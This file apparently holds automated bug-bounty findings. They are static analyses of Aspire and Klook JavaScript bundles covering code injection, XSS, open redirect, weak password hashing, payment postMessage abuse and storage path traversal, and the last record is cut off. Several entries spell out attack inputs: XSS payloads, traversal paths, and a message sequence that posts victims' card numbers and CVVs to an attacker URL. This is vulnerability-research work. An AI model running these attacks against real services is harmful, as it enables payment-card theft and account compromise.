{"host": "clouduat.youraspire.com", "endpoint": "Advanced Search / custom-column formula evaluation on the authenticated Angular app: agGridService.aggFuncCustom(searchField,params) -> eval(formula) [AG Grid custom footer aggregate] and buildFooterData() -> eval(formula) [custom aggregate footer row]; plus the 'Advanced Search Formula' admin editor (textarea bound to advancedSearchFormula.ColumnFormula) and the Estimate custom-column formula validator Function('\"use strict\";return ('+this.formula+')')()", "param": "searchField.CustomAggregateFormula (authored as the free-text advancedSearchFormula.ColumnFormula / custom-column 'formula' and persisted server-side in the search view / field definition); paired with searchField.ReferenceFieldNameList", "vuln_class": "CWE-95 Code Injection / CWE-94 - user-authored formula string executed with client-side eval()/Function() in the authenticated app origin (arbitrary JavaScript execution -> stored/DOM XSS, CWE-79 chain)", "evidence": "Deterministic, byte-verified in the shipped clouduat.youraspire.com Angular bundle main.352e10647eddc8f4.js (sha256 c8cb2e9faab9d513914bd09c83e82802b0be8a26fdffcbd82f433ac8caaec697; recomputed, 13,525,804 bytes). (1) SINK A / custom AG Grid footer aggregate: 'case\"custom\":V.aggFunc=C.aggFuncCustom.bind(C,F);' (byte-exact, offset ~5,947,860) binds the app's custom aggregate fn; its body is 'aggFuncCustom(searchField,params){let items,split=[],agg=[],fields=[],result,formula=searchField.CustomAggregateFormula;items=params.rowNode.allLeafChildren.map(...);split=searchField.ReferenceFieldNameList.split(\",\");...for(let Et=0;Et<fields.length;++Et)formula=formula.replace(new RegExp(\"\\\\b\"+fields[Et]+\"\\\\b\",\"g\"),agg[fields[Et]]);try{result=eval(formula),...' - i.e. the stored formula string is passed UNMODIFIED to the GLOBAL eval() at grid render time. (2) SINK B / footer row: in buildFooterData(gridData) the 'custom' branch reads 'let formula=searchField.CustomAggregateFormula; searchField.ReferenceFieldNameList.split(\",\").forEach(...formula=formula.replace(...)); try{ ... formula=formula.replace(regEx,\"\"); let result=eval(formula); ...}' -> a SECOND eval() of the same stored field. 'eval(' occurs EXACTLY 2 times in the whole 13,525,804-byte bundle (both of these, both fed by CustomAggregateFormula) and neither is shadowed by a local alias in scope, so bare global eval is used. (3) SOURCE is first-class attacker-authored free text: the admin 'Advanced Search Formula' dialog builds a <textarea> whose ngModelChange does 'I.DH7(Pe.advancedSearchFormula.ColumnFormula,Fe)||(Pe.advancedSearchFormula.ColumnFormula=Fe)' (byte-exact), i.e. the user types an arbitrary formula string; addToFormula()/finalizeFormData() operate on the same ColumnFormula; the estimate 'custom column' validator evaluates it with 'Function('\"use strict\";return ('+this.formula+\") )' (byte-exact at ~5,582,462) and only rejects it if the result isNaN. (4) PERSISTENCE + SHARING: the same search view carries the formula and is saved via getResourceUrl('SaveAdvancedSearch') with the share payload {..., SearchViewName, SharedEditWithRoleIDs, SharedEditWithUsers, SearchViewSharedWithAllRoles, SearchViewSharedWithAllUsers, ...} (byte-exact) and read back with SharedViaRole/SharedViaUserID, against enum kt={NotShared:0,Shared:1,Editable:2}; SearchFieldDisplay objects are constructed with 'this.CustomAggregateFormula=Mt.CustomAggregateFormula' from server data, so a shareable view/field can carry a formula executed on the loader's session. LIMITATION / LIVE CONFIRMATION REQUIRED: the sink, source, free-text authoring UI, save+share payload and the isNaN-only validation are all deterministic from the shipped artifact, but whether a formula authored/persisted by one principal executes in ANOTHER principal's authenticated session (search-view 'Shared with all users/roles' actually delivering CustomAggregateFormula to the second user) could not be executed from this VPS - the in-scope hosts return edge-WAF 403 to this egress and no request was sent (non-destructive). If the formula only ever executes for its author, this is self-XSS (explicitly NON-qualifying per scope). The credible escalation is: a user holding the non-admin ManageCustomFields permission (canEditAdvancedSearchFormula(){...K.SystemAdmin||K.ManageCustomFields}) authors a formula that runs in a SystemAdmin/BranchManager browser when that principal loads the shared column/view.", "confidence": "low", "artifacts": {"bundle": "clouduat.youraspire.com main.352e10647eddc8f4.js", "sha256": "c8cb2e9faab9d513914bd09c83e82802b0be8a26fdffcbd82f433ac8caaec697", "size": 13525804, "local_copy": "/root/hackbot-architecture/state/recon/aspire/js/main.352e10647eddc8f4.js", "eval_sites": ["~5966266 aggFuncCustom: result=eval(formula)", "~6747558 buildFooterData custom: let result=eval(formula)"], "authoring_ui": "advancedSearchFormula.ColumnFormula <textarea> (ngModelChange)", "validator_sink": "Function('\"use strict\";return ('+this.formula+')')() @ ~5582462"}, "added_by": "hunt-pass-aspire-codeinjection", "added_at": "2026-11-06T12:31:13.708801+00:00"}
{"host": "clouduat.youraspire.com", "endpoint": "attachment PDF preview: <app-attachment-pdf-wrapper> renders <object type=\"application/pdf\" [data]=\"pdfSafeUrl\"> where pdfSafeUrl = URL.createObjectURL(<bytes fetched from /api/FileAccess/AspireUploads/{AspireSystemID}/{UniqueId}{FileExtension}>) + '#navpanes=0&view=FitH&toolbar=1&page=1'; value bound through the app's 'safeResourceURL' pipe (= DomSanitizer.bypassSecurityTrustResourceUrl). Preview type is chosen solely by the attachment file EXTENSION.", "param": "attachment FileExtension (must be '.pdf' to select this preview branch) + attachment file CONTENT (raw bytes stored server-side and re-fetched by the client to build the blob URL)", "vuln_class": "XSS (stored/DOM) — untrusted file content rendered as a same-origin document, Angular sanitizer bypass (bypassSecurityTrustResourceUrl / safeResourceURL pipe). CWE-79 (+CWE-436 file-type confusion)", "evidence": "All facts below are byte-verified in the shipped clouduat.youraspire.com Angular bundle main.352e10647eddc8f4.js (sha256 c8cb2e9faab9d513914bd09c83e82802b0be8a26fdffcbd82f433ac8caaec697). (1) SINK: module 82995 defines the component whose selector is [\"app-attachment-pdf-wrapper\"], inputs {pdfSafeUrl,thumbnail,width,height}; its template consts are [[1,\"pdf-wrapper\"],[\"class\",\"card-overlay\",3,\"style\",4,\"ngIf\"],[\"type\",\"application/pdf\",3,\"data\",\"style\",\"error\",4,\"ngIf\"],...] and the render fn is C(I,F){e.j41(0,\"object\",5)...e.Y8G(\"data\",V.pdfSafeUrl,e.f$h)} i.e. <object type=\"application/pdf\" [data]=\"pdfSafeUrl\"> — a nested browsing context, not an <img>. (2) SAFE-VALUE BYPASS: the preview dialog binds it as t.nrm(0,\"app-attachment-pdf-wrapper\",8),t.nI1(1,\"safeResourceURL\") ... t.Y8G(\"pdfSafeUrl\",t.bMT(1,2,T.previewPath))(\"thumbnail\",!1); the pipe is defined as transform(A){return this.domSanitizer.bypassSecurityTrustResourceUrl(A)} with ɵpipe {name:\"safeResourceURL\",pure:!0} (module 85113/ac) — so the URL reaches the DOM unsanitized (SafeValue). (3) SOURCE / same-origin blob: getAttachmentPreview(type,ce) selects the branch via getAttachmentExtensionFileType(ce.Attachment); getAttachmentExtensionFileType(pe){if(pe&&pe.FileExtension)switch(pe.FileExtension.substring(1).toLowerCase()){case\"pdf\":return k.PDF; case\"doc\"...; case\"jpg\"...:return k.Image; default:return k.Other}} -> type is decided ONLY by the stored FileExtension string. For k.PDF: getPdfDownloadPath(pe,ce){...else{const J=yield $.fileService.getFile($.attachmentsService.getAttachmentDownloadPath(pe.Attachment)); U=`${URL.createObjectURL(J)}${A.H.pdfPreviewOptions(ce)}`}return U} where getAttachmentDownloadPath(Ke){return `AspireUploads/${Ke.AspireSystemID}/${Ke.UniqueId}${Ke.FileExtension}`} and pdfPreviewOptions(C){return `#navpanes=0&view=FitH&toolbar=${+C}&page=1`}. URL.createObjectURL() produces a blob: URL that inherits the CREATING document's origin (clouduat.youraspire.com), and the <object> 'type' attribute is only a hint — rendering is governed by the resource's actual MIME type, so markup served as HTML/SVG in that blob executes as a same-origin document. (4) ATTACKER-CONTROLLED SOURCE is a first-class feature: users (scope permits System Admin / Branch Manager) upload attachments via attachmentsService.uploadAttachment -> POST getResourceUrl(\"AttachmentUpload\") with te(Ke,Re.name,U,...) = {FileName: file.name, FileData: base64}; the only client-side restriction is the cosmetic PrimeNG accept/allowedExtensions list (ALLOWED_IMAGE_TYPES=[\".ai\",\".bmp\",\".dib\",\".dng\",\".emf\",\".gif\",\".heic\",\".heif\",\".jfif\",\".jp2\",\".jpeg\",\".jpg\",\".png\",\".svg\",\".tif\",\".tiff\",\".webp\"]) — server-side enforcement is not observable statically. Attack: upload a file named x.pdf whose CONTENT is '<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"...\">' or '<script>...</script>' HTML, then open it so the PDF preview branch renders the same-origin blob inside <object type=application/pdf>; the payload executes in the clouduat.youraspire.com origin (self-XSS when the uploader previews; stored XSS against any other user/role who opens the same attachment). LIMITATION / LIVE CONFIRMATION REQUIRED: the client-side sink, the extension-only type selection, the unsanitized binding and the blob same-origin property are all deterministic from the shipped artifact, but whether the server preserves the uploaded content's MIME (serving e.g. text/html or sniffable content for a '.pdf'-named file) versus forcing application/pdf could not be verified from the VPS — the in-scope hosts return an edge-WAF 403 to this egress and no request was sent (non-destructive). If the backend stores/serves the original Content-Type (or a client-side content-sniff results), this is a stored XSS; if it always coerces Content-Type: application/pdf the object renders blank and there is no impact. NO DUPLICATE: no youraspire/Aspire entry and no safeResourceURL/attachment-preview entry exists in findings/confirmed.jsonl, rejected.jsonl, archive.jsonl or candidates.jsonl.", "confidence": "low", "artifacts": {"bundle": "clouduat.youraspire.com main.352e10647eddc8f4.js", "sha256": "c8cb2e9faab9d513914bd09c83e82802b0be8a26fdffcbd82f433ac8caaec697", "size": 13525804, "local_copy": "/root/hackbot-architecture/state/recon/aspire/js/main.352e10647eddc8f4.js"}, "added_by": "hunt-pass-aspire-xss", "added_at": "2026-11-06T12:50:12.951701+01:00"}
{"host": "clouduat.youraspire.com", "endpoint": "login flow (app-login component) -> GET /proxy/main/api/MarketingPro/GetMarketingProSso?initialRedirectUri=<attacker> (client resource name 'GetMarketingProSso', service class MarketingPro, built by getResourceUrl) ; result consumed as window.open(je.RedirectUri, \"_self\")", "param": "initial_redirect_uri (URL query parameter of the login route) -> forwarded verbatim as request param initialRedirectUri; gate = environmentConfig.marketingProUrlMatch (array of URL patterns, runtime value from GET /api/configuration, shipped default [])", "vuln_class": "CWE-183 Permissive List of Allowed Inputs / CWE-601 Open Redirect - URL allowlist enforced with String.prototype.includes() (substring/any-position match, no origin parsing) on an attacker-supplied redirect target, after which the post-login flow performs a TOP-LEVEL navigation (window.open(RedirectUri,\"_self\")) to a URI returned by the SSO endpoint for that unvalidated input", "evidence": "Byte-verified in the shipped clouduat.youraspire.com Angular bundle main.352e10647eddc8f4.js (sha256 c8cb2e9faab9d513914bd09c83e82802b0be8a26fdffcbd82f433ac8caaec697, 13,525,804 bytes; identical sha256 to the copy already used by the ASP-2026-REJ-001 validation). THREE code facts, each extracted verbatim from the file: (1) THE ALLOWLIST CHECK IS A SUBSTRING MATCH: isMarketingProPortal(){return this.route.snapshot.queryParamMap.has(\"initial_redirect_uri\")&&this.configService.getEnvironmentConfig().marketingProUrlMatch.some(T=>this.route.snapshot.queryParamMap.get(\"initial_redirect_uri\").includes(T))}  -- the only client-visible validation applied to the caller-supplied redirect target is String.includes() against the config array marketingProUrlMatch; no new URL(), no origin/host/prefix comparison and no separator handling, so any attacker URL that merely CONTAINS an allowed pattern anywhere in its own query/fragment/path passes (e.g. for pattern P: \"https://evil.example/?x=\"+P). The shipped default is literally marketingProUrlMatch:[] (environment-config defaults object), the effective array is delivered at runtime by GET /api/configuration (api/configuration literal is in the same bundle). (2) THE SUPPLIED VALUE IS FORWARDED TO THE SSO BACKEND: onLoginAttempted(){...T.Succeeded? ... (yield Te.hasMarketingProPermission())&&Te.isMarketingProPortal()?Te.marketingProService.getSsoUri(Te.route.snapshot.queryParamMap.get(\"initial_redirect_uri\")).subscribe({next:je=>{window.open(je.RedirectUri,\"_self\")},error:...}) : Te.isAnalyticsLaunchReturnUrl()? ... : yield Te.navigateAfterLogin(Te.returnUrl) ...} and class MarketingPro (super(T,Te,\"MarketingPro\")) exposes getSsoUri(T){const Te=this.getResourceUrl(\"GetMarketingProSso\"),je=(new _.Nl).append(\"initialRedirectUri\",T??\"\");return this.httpClient.get(Te,{params:je})} -> GET {apiBaseUrl}/api/MarketingPro/GetMarketingProSso?initialRedirectUri=<attacker value>. Contrast with the app's OWN hardened sibling for the same problem: sanitizeReturnUrl(ce){if(!ce||\"string\"!=typeof ce)return\"/app\";const $=ce.trim();if(this.isAhaPortalReturnUrl($))return $;const U=this.domSanitizer.sanitize(t.WPN.URL,$);return U&&U.startsWith(\"/\")&&!U.startsWith(\"//\")?U:\"/app\"} (absolute-URL + protocol-relative rejected by construction) and isAhaPortalReturnUrl(ce){...new URL(ce)...U.host===J.host}, i.e. the codebase enforces real origin/host checks on the OTHER redirect path and only uses a substring check here. (3) THE RESULT IS A TOP-LEVEL NAVIGATION SINK: window.open(je.RedirectUri,\"_self\") - the returned URI replaces the whole tab (\"_self\"), so an attacker-chosen destination means genuine open redirect / post-login phishing drop, and any credential/token material the SSO hand-off appends to that URL would be delivered to the attacker origin. LIMITATION / NOT PROVEN (live confirmation required, which is why confidence is low): the actual destination is produced SERVER-SIDE by GetMarketingProSso - the client never derives RedirectUri - so whether the backend re-validates initialRedirectUri, or derives RedirectUri from it (by design the parameter is the portal the user came from and should be returned to), is NOT observable in any shipped artifact, and the in-scope hosts return an edge-WAF 403 to this VPS (non-destructive mandate: no request was sent, no payload was used, nothing was mutated). Exploit also requires the victim to be authenticated AND to hold the MarketingPro feature + MarketingPro permission (hasMarketingProPermission() = userPrincipalService.user.AspireSystemSettings.MarketingProIntegration && permissionsService.hasPermissionAsync(\"MarketingPro\")), and to follow a crafted /login?...&initial_redirect_uri=<hostile> link while logging in. Missing evidence: (a) the live value of marketingProUrlMatch from GET /api/configuration; (b) a live GetMarketingProSso response showing RedirectUri pointing at the supplied hostile origin (i.e. server-side trust); (c) an end-to-end capture of the window.open(\"_self\") landing on the attacker origin. DUPLICATE CHECK: no entry mentioning initial_redirect_uri, MarketingPro, marketingProUrlMatch or GetMarketingProSso exists in findings/candidates.jsonl, findings/rejected.jsonl or findings/archive.jsonl (grep-verified, 0 occurrences each), and no clouduat redirect/URL-allowlist candidate exists there either (the only clouduat entries are the attachment-preview blob XSS ASP-2026-REJ-001 and the Advanced Search formula eval). Class is qualifying per /root/hackbot-architecture scope list (open redirect; URL-allowlist bypass) - BAC/IDOR and XSS-at-main.youraspire.com/api/* are the excluded ones, neither is touched here.", "confidence": "low", "artifacts": {"bundle": "clouduat.youraspire.com main.352e10647eddc8f4.js", "sha256": "c8cb2e9faab9d513914bd09c83e82802b0be8a26fdffcbd82f433ac8caaec697", "size": 13525804, "local_copy": "/root/hackbot-architecture/state/recon/aspire/js/main.352e10647eddc8f4.js", "exact_snippets": ["isMarketingProPortal(){return this.route.snapshot.queryParamMap.has(\"initial_redirect_uri\")&&this.configService.getEnvironmentConfig().marketingProUrlMatch.some(T=>this.route.snapshot.queryParamMap.get(\"initial_redirect_uri\").includes(T))}", "getSsoUri(T){const Te=this.getResourceUrl(\"GetMarketingProSso\"),je=(new _.Nl).append(\"initialRedirectUri\",T??\"\");return this.httpClient.get(Te,{params:je})}", "Te.isMarketingProPortal()?Te.marketingProService.getSsoUri(Te.route.snapshot.queryParamMap.get(\"initial_redirect_uri\")).subscribe({next:je=>{window.open(je.RedirectUri,\"_self\")", "marketingProUrlMatch:[]"]}, "added_by": "hunt-pass-aspire-open-redirect-url-allowlist", "added_at": "2026-11-06T14:31:05.144816+01:00"}
{"host": "klook.klktech.com", "endpoint": "/static/js/activity_detail.<chunk>.js — markdownToHtml() result rendered via Vue domProps:{innerHTML:...} on the activity detail page (fields: activityInfo.summary, package_options, howToUse, packageOption, itinerary, insider_tips, inclusive_of, not_inclusive_of, confirmation_details, additional_information, policy)", "param": "activity description markdown (server/CMS-sourced content)", "vuln_class": "CWE-79 DOM/HTML injection — unsanitized markdown rendered to innerHTML (marked sanitize:false) with only a bypassable www.klook.com link-neutralizer", "evidence": "Shipped bundle activity_detail.4cb6727c.js (sha256 c12bbbb87d90d09824d4e3f51770d8546645e39d819119c4a4d5a2bcf8118032) defines: markdownToHtml:function(t){if(\"string\"!=typeof t)return\"\";var e=t?s()(t):\"\";return e.replace(/href\\s*=\\s*(['\\\"])(https?:\\/\\/)?www\\.klook\\.com.*?\\1/gi,'href=\"javascript:void(0);\"')} where s()=marked configured with sanitize:!1,sanitizer:null (its renderer.link only sanitizes when options.sanitize is true). The returned HTML is injected raw via domProps:{innerHTML:t._s(t.markdownToHtml(<field>))} at 11 call sites in each activity_detail chunk (content fetched from /v1/agentwebserv/activity/{id}); the only neutralization is a regex that rewrites links whose href contains www.klook.com, so any raw HTML/event-handler or javascript: link in the markdown is rendered unescaped -> stored/DOM HTML-injection sink. Repro (static, node): with marked({sanitize:false}) the input '<img src=x onerror=alert(1)>' returns the raw tag (no escaping) and '[x](javascript:alert(1))' returns href=\"javascript:alert(1)\". LIMITATION: the unsafe sink is proven from shipped artifacts, but the ability to author the activity markdown was NOT demonstrated in this pass (all 11 call sites take server/CMS activity fields), so the injection vector is unproven.", "confidence": "low"}
{"host": "klook.klktech.com", "endpoint": "/static/js/login.c0f63a53.js - LoginPage.submit() -> POST /v1/agentwebserv/login/account (agent/B2B login)", "param": "password (md5(password) sent as the credential)", "vuln_class": "CWE-326 Insufficient Cryptography (+CWE-916) - password client-hashed with unsalted MD5 and the digest transmitted as the authentication credential (password-equivalent secret / pass-the-hash)", "evidence": "Shipped agent-login bundle login.c0f63a53.js (sha256 54f819548695cb75b42463883f196d1e47b041ba3300dba6c6b6cc8e1aed8bf8) LoginPage.submit() calls e.ajaxPost(\"/v1/agentwebserv/login/account\",{user_channel:this.userChannel,username:this.username,password:e.md5(this.password),gateway:\"agent\",refer_url:location.href,need_cookie:!0,image_url:\"\"},cb). The plaintext password is transformed client-side with unsalted MD5 (bundled js-md5; app bundle exports md5 via n.d(t,\"md5\",function(){return c})) and only the resulting digest is sent as the credential. Because the transmitted value is the unsalted-MD5 secret itself it is a password-equivalent credential: any observer of the value (XSS on the page, malicious browser extension, reverse-proxy/access log at rest, or a server-side leak) can authenticate on the B2B agent portal without recovering the plaintext (pass-the-hash), and unsalted MD5 is trivial to crack offline (rainbow tables). The same request issues a session cookie (need_cookie:!0), so a replayed digest yields a full session. LIMITATION: server-side storage/comparison method is not verifiable from shipped artifacts; the live host returns edge-WAF 403 from this VPS (bot management), so no request was sent (non-destructive, per scope). Impact low/conditional (requires digest exposure). Class is explicitly qualifying per scope (insufficient cryptography).", "confidence": "low"}
{"host": "merchant.klook.com", "endpoint": "/s/dist/desktop/js/login_form.a6c4968266f3c14cba4f.js - merchant login -> POST /v1/merchantserv/account/login", "param": "password (md5(password) sent as the credential)", "vuln_class": "CWE-326 Insufficient Cryptography (+CWE-916) - password client-hashed with unsalted MD5 and the digest transmitted as the authentication credential (password-equivalent secret / pass-the-hash)", "evidence": "Shipped merchant login bundle login_form.a6c4968266f3c14cba4f.js (sha256 ac2145c5053f09a6ec5f593a8cca85386d6077f33e4e0d962139d8b2f495455a) login() calls e.ajaxPost(o.default.user_login,{username:n,password:e.md5(this.login_form.password)},cb); the API map in merchant.bundle.js (sha256 d81cdbed5fc9bbe206ec1561561d8ff4c21402f5a967ae30d4cccceed91e1e71) defines user_login:\"/v1/merchantserv/account/login\". Same anti-pattern as the agent portal: the plaintext password is transformed client-side with unsalted MD5 and only the digest is transmitted as the login credential -> password-equivalent secret (pass-the-hash if the digest is observed: XSS, malicious extension, proxy/log at rest, server leak) and trivial offline cracking (unsalted MD5). LIMITATION: server-side handling not verifiable from shipped artifacts; live host returns edge-WAF 403 from this VPS so no request was sent (non-destructive). Class is explicitly qualifying per scope (insufficient cryptography); impact low/conditional.", "confidence": "low"}
{"host": "pay.klook.com", "endpoint": "/index.html (payment widget app bundle _js_app.4de5eeee.js) - window.addEventListener(\"message\",$e) cross-window payment bridge", "param": "postMessage event fields: r.type ('init','requestNewCardToken','cybersourceSubmit','validateNewCreditCardInfo',...) and r.props (cybersourcePayFromData.action, sdkType, publicKey, themeColor, ...); e.origin unvalidated", "vuln_class": "CWE-346 Origin Validation Error (cross-window postMessage) -> payment-card data exfiltration: attacker-controlled form action with victim PAN/CVV/expiry, attacker-key card tokenization, replies to attacker origin", "evidence": "Shipped pay.klook.com payment-widget bundle _js_app.4de5eeee.js (sha256 01442d14a008410e6bdb3bfd0e020298a0f4cd97565c604dc0da333e7ae2dc6a, 73041 bytes; durable copy at /root/hackbot-architecture/state/recon/klook/js_pay/pay_klook.com_index_app.4de5eeee.js) installs a GLOBAL cross-origin message handler with NO origin validation and routes message types into dangerous payment sinks. Byte-exact in-bundle: $e=function(e){var t=e.origin,r=e.data;if(r.props){var a=r.props,..,u=a.cybersourcePayFromData;switch(r.type){case\"init\":if(!me){Ee(n);..me=new h({propsData:{paymentType:l,resEnLang:o,localization:c,supportedCards:s,cardTypeRules:d,fromOrigin:t}}).$mount(\"#app\")}break;..case\"requestNewCardToken\":..me.requestNewCardToken(r.props);break;..case\"validateNewCreditCardInfo\":..me.validateNewCreditCardInfo();break;case\"cybersourceSubmit\":..me.submitCybersourcePayFrom(u);break;default:break}}};window.addEventListener(\"message\",$e,!1)  -- the message origin (`e.origin`) is read into `t`/`fromOrigin` but NEVER compared to any allowlist. Deterministic proof there is no origin gate: the token `.origin` occurs EXACTLY ONCE in the whole 73,041-byte bundle (that one read) and the file contains 0 occurrences of any allowlist/whitelist/indexOf(\"https\"/checkOrigin construct (grep-verified: '.origin'->1, 'whitelist'->0, 'allowlist'->0, indexOf(\"https'->0). Any window holding a reference to this payment frame/popup can drive it. SINK 1 (card exfiltration via arbitrary form action): case cybersourceSubmit -> submitCybersourcePayFrom:function(e){var t=be.call(this);e.data=Object.assign(e.data,{card_number:t.number,card_cvn:t.cvv,card_expiry_date:\"\".concat(t.expirationMonth,\"-\").concat(t.expirationYear)});for(var r=document.querySelector(\"#sybersource_new_card_payment_form\");..){r.querySelector(\".\"+l).value=c} r.action=e.action,r.submit()}  where be=function(){var e=(this.$refs.paymentForm.creditCardInfo.number||\"\").replace(/\\s/g,\"\");return{number:e,expirationMonth:..,expirationYear:..,cvv:..}}  -- i.e. the card number/CVV/expiry the VICTIM typed into the rendered form are copied into the Cybersource form and the form ACTION is taken from the attacker-supplied message field cybersourcePayFromData.action, then submitted -> the victim's PAN/CVV/expiry are POSTed to an attacker-chosen URL. SINK 2 (attacker-key tokenization): case requestNewCardToken -> requestNewCardToken:function(e){i=e.sdkType; ke()[i].call(t,e)} with ke=function(){return{adyen:ye,braintree:we,stripe:_e,ntt_data:xe,cybersource:Me}}; ye=function(e){var t=e.publicKey,..,o=n.createEncryption(t,a),l=be.call(this)..} (Adyen: encrypts the victim's card with the ATTACKER-supplied publicKey) and _e=function(e){var t=e.publicKey,..;Stripe.setPublishableKey(t);..} (Stripe: tokenizes the victim's card with the ATTACKER publishable key) -> attacker obtains a token for the victim's card. SINK 3 (reply leak to unvalidated origin): ge=function(e,t){var r=window.parent;r.postMessage(e,t)} is called back with the attacker origin as targetOrigin (e.g. ge({type:\"generateNewCardToken\",props:{sdkType:i,tokenResp:a}},t.fromOrigin); ge({type:\"generateNewCardValidateResult\",..},e.fromOrigin)), so replies are delivered to whatever origin sent the message. LIMITATION / REACHABILITY (live confirmation required): the code facts above are deterministic from the shipped artifact, but the LIVE effect could not be executed from this VPS (in-scope Klook hosts return edge-WAF 403 to this egress; prior PoC capture (/tmp/capture.log) shows no cybersourceSubmit POST captured, only a local /selftest). The remaining gate is purely environmental: an attacker page must obtain a window reference to https://pay.klook.com/index.html (window.open/popup works irrespective of X-Frame-Options; a user gesture or an iframe where framing is permitted) and the victim must enter card details into that Klook-rendered form; the attacker then postMessages {type:'init',props:{...}} followed by {type:'cybersourceSubmit',props:{cybersourcePayFromData:{action:'https://attacker/collect',data:{...}}}} (or requestNewCardToken with an attacker publicKey). Non-destructive: no payload was sent to any Klook host; the handler/sinks were proven only from the shipped bundle + pre-existing static PoC files (scratch/klook_pm/attacker2..6.html). Qualifying: business logic with real impact / CSRF-with-impact / insecure auth+data-handling on an in-scope Critical-$2000 payment host; impact = payment-card (PAN/CVV/expiry) exfiltration / fraudulent tokenization. Not a duplicate: no pay.klook.com / postMessage entry exists in confirmed.jsonl, candidates.jsonl, rejected.jsonl or archive.jsonl.", "confidence": "medium", "artifacts": {"bundle": "pay.klook.com _js_app.4de5eeee.js", "sha256": "01442d14a008410e6bdb3bfd0e020298a0f4cd97565c604dc0da333e7ae2dc6a", "size": 73041, "durable_copy": "/root/hackbot-architecture/state/recon/klook/js_pay/pay_klook.com_index_app.4de5eeee.js", "static_poc": ["/root/.hermes/cache/scratch/klook_pm/attacker2.html", "/root/.hermes/cache/scratch/klook_pm/attacker3.html", "/root/.hermes/cache/scratch/klook_pm/attacker4.html", "/root/.hermes/cache/scratch/klook_pm/attacker5.html", "/root/.hermes/cache/scratch/klook_pm/attacker6.html"]}, "added_by": "hunt-pass-postmessage", "added_at": "2026-11-06T10:49:33.690239+01:00"}
{"host": "www.klook.com", "endpoint": "/v3/userserv/user/profile_service/bind_google (invoked by GoogleOneTapBind.googleBind() in the archived homepage chunk pages-home-page-home-desktop-index; API map key googleBind)", "param": "skip_verify=true (client-injected form body param); access_token=<Google One Tap credential>", "vuln_class": "CWE-287 Improper Authentication / CWE-863 Incorrect Authorization - client-controlled skip_verify=true on a Google account-BINDING request (broken auth / account-binding logic; potential account takeover)", "evidence": "Archived in-scope www.klook.com homepage bundle (webpack chunk pages-home-page-home-desktop-index, sha256 d89066181ee2bf161a81c348cf1f0bcefbfee7f1960cee8b4ebc6647573d6d74) contains, byte-exact: GoogleOneTapBind.handleCredentialResponse(e){this.credential=e.credential,this.googleBind()} and googleBind() issuing this.$axios.$post(<googleBind api>, access_token=<this.credential>&skip_verify=true, {CSRF:true}). The API map in the same build (client.js, sha256 9b8e72196544de75ee690a32c591944b8c47d88110c7b53d9a1e724d47e12455) defines googleBind = /v3/userserv/user/profile_service/bind_google. So the BROWSER decides to send skip_verify=true on an account-binding call that attaches a Google identity to the logged-in Klook account. The same API map shows the parallel email-binding path requires a captcha (sendBindEmail = /v3/userserv/user/profile_service/send_bind_email_with_captcha), i.e. a verification step is enforced for email binding while the client can request its suppression for google binding. LIMITATION: the server-side effect of skip_verify is NOT verifiable from shipped artifacts; no request was sent (all www.klook.com routes return edge-WAF 403/DataDome from this VPS; non-destructive, no attack payloads). Live authenticated test required: POST /v3/userserv/user/profile_service/bind_google with access_token=<attacker-controlled Google credential>&skip_verify=true from an authenticated session, then determine whether identity/ownership verification of the bound account is bypassed. Class qualifying (auth bypass / insecure auth); impact conditional -> confidence low.", "confidence": "low"}
{"host":"clouduat.youraspire.com","endpoint":"advanced-search service via the BFF /proxy/search: POST {advancedSearchApiBaseUrl}/{AdvancedSearch-base}/GetExportDownloadUrl (client resource name \"GetExportDownloadUrl\") with body {BlobContainer,BlobPath,FileName} -> returns a ready-to-use download URL as text, consumed by file-saver saveAs()","param":"BlobContainer, BlobPath, FileName (request-body path components)","vuln_class":"CWE-22 / unvalidated client-supplied storage path -> arbitrary file (blob) read: the server-side download-URL minter takes the container and blob path from the request instead of deriving/scoping them from the caller identity or the export job, and the app's own code proves no client-side validation or scoping exists","evidence":"Byte-verified in the shipped bundle clouduat.youraspire.com main.352e10647eddc8f4.js (sha256 c8cb2e9faab9d513914bd09c83e82802b0be8a26fdffcbd82f433ac8caaec697, 13,525,804 bytes; hash recomputed this pass). (1) THE ENDPOINT CONTRACT IS PATH-IN / URL-OUT AND THE PATH COMPONENTS COME FROM THE REQUEST BODY: getExportDownloadUrl(Mt,nt,yt){var we=this;return(0,e.A)(function*(){const mt=we.getResourceUrl(\"GetExportDownloadUrl\");return yield we.httpClient.post(mt,{BlobContainer:Mt,BlobPath:nt,FileName:yt},{responseType:\"text\"}).toPromise()})()} - the AdvancedSearch service builds the URL as `${getBaseUrl(...)}/${name}` off advancedSearchApiBaseUrl \"/proxy/search\". (2) THE ONLY IN-BUNDLE CALLER PASSES THE VALUES STRAIGHT FROM THE SERVER RESULT WITH ZERO CLIENT-SIDE SCOPING OR VALIDATION: downloadExport(){ ... const Gt=ti.backgroundTaskMessage?.WorkUnits[0].WorkUnitResult; if(Gt?.BlobContainer&&Gt?.BlobPath) try{ const Fi=yield ti.advancedSearchServiceFactory.Create(Gt.ObjectCode??\"\").getExportDownloadUrl(Gt.BlobContainer,Gt.BlobPath,Gt.FileName); Fi&&(k.saveAs(Fi,Gt.FileName), ti.backgroundNotificationsLogicService.onMessageClick(ti.backgroundTaskMessage)) }catch{ ... } } - i.e. the client trusts BlobContainer/BlobPath from the background-task payload and hands them to an endpoint that mints a download URL for them; nothing anywhere in the app checks that the container/path belongs to the calling user or system. A crafted request can therefore supply any BlobContainer+BlobPath and obtain the server-minted URL (e.g. another system's export blob, or a traversal such as an export path with ../ segments).","confidence":"low","validation":{"artifact_sha256_recomputed":"c8cb2e9faab9d513914bd09c83e82802b0be8a26fdffcbd82f433ac8caaec697","artifact_size_bytes":13525804,"claim_sha256_match":true,"client_side_path_validation_present":false,"server_side_authorization_verified":false,"response_is_signed_download_url":true,"live_verification":"none performed - in-scope hosts return an edge-WAF 403 to this VPS egress (non-destructive mandate; no request sent)","duplicate_of_decided":false},"missing_evidence":"Server behaviour is unobservable and untested. Needed to confirm: (a) POST a body whose BlobPath points at another system's export (or contains traversal, e.g. `exports/../<otherSystem>/<file>`) and check whether a signed URL is returned AND fetchable - negative-test with the caller's own export path; (b) whether the server validates that BlobContainer/BlobPath belong to the caller AspireSystemId/tenant or merely signs whatever path it is given; (c) whether BlobPath is normalised server-side. SCOPE FLAG for the validator: this resource sits behind the clouduat.youraspire.com BFF and the program excludes \"BAC / IDOR (clouduat.youraspire.com)\" - triage explicitly as an unvalidated client-supplied storage path / path traversal (qualifying) versus BOLA (excluded) once the server behaviour is known. Not a duplicate: no 